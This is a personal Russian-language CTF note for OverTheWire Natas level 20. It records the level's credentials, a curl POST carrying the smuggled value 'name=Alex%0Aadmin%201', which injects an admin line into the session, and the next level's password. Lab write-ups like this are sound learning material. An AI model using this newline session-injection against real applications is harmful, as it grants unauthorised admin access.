---
tags:
  - ctf
created: 2026-04-06
---

# `Level [20]` 
> You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.

## 🔐 Учётные данные
| Параметр | Значение                                   |
| -------- | ------------------------------------------ |
| Host     | http://natas20.natas.labs.overthewire.org/ |
| Port     |                                            |
| Login    | natas20                                    |
| Password | p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw           |

## 🎯 Цель уровня
- Получить пароль через Session Injection
## 🎯 Информация

| Тип информации | Данные |
| -------------- | ------ |
|                |        |


  
  
  

## 📚 Ключевые команды/Техники
| Команда                                               | Описание                       |
| ----------------------------------------------------- | ------------------------------ |
| curl -u natas20:p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw \    | авторизация на сайт            |
| -X POST \                                             | овердрайв метода запросов      |
| -d "name=Alex%0Aadmin%201" \                          | ПОСТ запрос                    |
| http://natas20.natas.labs.overthewire.org/index.php \ | ссылка куда курл делает запрос |
| -b cookies.txt -c cookies.txt                         | Запись и чтение кукисов        |

## 💡 Пошаговое решение
| Шаг | Действие                                                | Команда/Код           |
| --- | ------------------------------------------------------- | --------------------- |
| 1   | Отправить POST запрос в запрос name                     | name=Alex%0Aadmin%201 |
| 2   | Потом отправить GET запрос сайту просто войдя по ссылке |                       |
| 3   |                                                         |                       |

## 🔍 Результат
Флаг/Пароль: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH

## 🚪 Переход
-> [Level_20]

## 🔗 Ссылки
- [Название ресурса](URL)

